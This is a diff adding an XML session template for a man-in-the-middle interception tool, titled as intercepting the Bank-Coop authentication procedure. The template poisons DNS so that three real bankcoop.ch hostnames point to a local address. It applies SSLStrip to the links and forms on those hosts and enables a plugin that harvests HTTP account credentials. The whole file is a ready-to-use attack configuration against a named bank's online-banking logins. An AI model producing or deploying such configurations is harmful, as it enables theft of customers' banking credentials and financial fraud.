@@ -1,0 +1,67 @@
+	<SessionTemplate>
+<Config name="authentication_bankcoop" description="Intercepting Bank-Coop authentication procedure">
+</Config>
+
+<Plugins>
+<Plugin name="DNS Poisoning" dirname="DNSPoisoning">
+
+<ArrayOfDNSPoisonRecord xmlns:xsd="http://www.w3.org/2001/XMLSchema" xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance">
+  <DNSPoisonRecord>
+    <HostName>onlinebanking.bankcoop.ch</HostName>
+    <IPAddress>192.168.43.133</IPAddress>
+  </DNSPoisonRecord>
+  <DNSPoisonRecord>
+    <HostName>www.bankcoop.ch</HostName>
+    <IPAddress>192.168.43.133</IPAddress>
+  </DNSPoisonRecord>
+  <DNSPoisonRecord>
+    <HostName>bankcoop.ch</HostName>
+    <IPAddress>192.168.43.133</IPAddress>
+  </DNSPoisonRecord>
+</ArrayOfDNSPoisonRecord>
+</Plugin>
+
+<Plugin name="HTTP accounts" dirname="HTTPAccounts">
+<PluginData xmlns:xsd="http://www.w3.org/2001/XMLSchema" xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance">
+  <Records />
+</PluginData>
+</Plugin>
+
+<Plugin name="SSLStrip" dirname="SSLStrip">
+
+<ArrayOfSSLStripRecord xmlns:xsd="http://www.w3.org/2001/XMLSchema" xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance">
+  <SSLStripRecord>
+    <HostName>onlinebanking.bankcoop.ch</HostName>
+    <ContentType>text/html</ContentType>
+    <Tag>a</Tag>
+  </SSLStripRecord>
+  <SSLStripRecord>
+    <HostName>onlinebanking.bankcoop.ch</HostName>
+    <ContentType>text/html</ContentType>
+    <Tag>form</Tag>
+  </SSLStripRecord>
+  <SSLStripRecord>
+    <HostName>www.bankcoop.ch</HostName>
+    <ContentType>text/html</ContentType>
+    <Tag>form</Tag>
+  </SSLStripRecord>
+  <SSLStripRecord>
+    <HostName>www.bankcoop.ch</HostName>
+    <ContentType>text/html</ContentType>
+    <Tag>a</Tag>
+  </SSLStripRecord>
+  <SSLStripRecord>
+    <HostName>bankcoop.ch</HostName>
+    <ContentType>text/html</ContentType>
+    <Tag>a</Tag>
+  </SSLStripRecord>
+  <SSLStripRecord>
+    <HostName>bankcoop.ch</HostName>
+    <ContentType>text/html</ContentType>
+    <Tag>form</Tag>
+  </SSLStripRecord>
+</ArrayOfSSLStripRecord>
+</Plugin>
+
+</Plugins>
+</SessionTemplate>
